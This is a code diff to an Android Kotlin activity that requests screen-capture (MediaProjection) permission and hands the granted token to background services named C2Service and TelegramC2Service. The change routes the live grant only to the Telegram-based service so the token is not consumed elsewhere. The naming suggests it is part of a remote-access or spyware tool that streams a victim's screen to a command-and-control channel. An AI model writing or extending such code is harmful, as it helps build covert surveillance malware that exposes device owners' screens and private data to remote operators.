@@ -6,7 +6,6 @@ import android.content.Intent
 import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.Bundle
-import android.util.Log
 
 class MediaProjectionSetupActivity : Activity() {
     private val REQ = 0xC2
@@ -26,21 +25,22 @@ class MediaProjectionSetupActivity : Activity() {
                 .putString("proj_data", data.toUri(0))
                 .apply()
 
-            // Notify BOTH services; whichever is running picks it up
-            for (cls in listOf(C2Service::class.java, TelegramC2Service::class.java)) {
-                val svc = Intent(this, cls).apply {
-                    action = "START_PROJECTION"
-                    putExtra("proj_result_code", resultCode)
-                    putExtra("proj_data", data)
-                }
-                try {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                        startForegroundService(svc)
-                    else
-                        startService(svc)
-                } catch (_: Exception) {}
+            // Send the live Intent to TelegramC2Service only.
+            // Do NOT send to C2Service — that would consume the token.
+            val svc = Intent(this, TelegramC2Service::class.java).apply {
+                action = "START_PROJECTION"
+                putExtra("proj_result_code", resultCode)
+                putExtra("proj_data", data)
             }
-            LogBus.append(applicationContext, "MP", "both services notified")
+            try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                    startForegroundService(svc)
+                else
+                    startService(svc)
+                LogBus.append(applicationContext, "MP", "TelegramC2Service notified")
+            } catch (e: Exception) {
+                LogBus.append(applicationContext, "MP", "start service failed: ${e.message}")
+            }
         } else {
             LogBus.append(applicationContext, "MP", "denied/cancelled")
         }
